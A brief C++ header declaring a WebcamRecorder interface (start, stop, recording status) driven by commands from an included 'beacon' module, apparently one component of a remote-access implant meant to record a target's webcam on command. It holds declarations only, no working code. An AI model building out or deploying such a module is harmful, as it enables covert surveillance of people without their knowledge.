#pragma once
#include "../beacon.h"

namespace WebcamRecorder {
    void Start(const std::string& params);
    void Stop();
    void OnCommand(const Beacon::Command& cmd);
    bool IsRecording();
}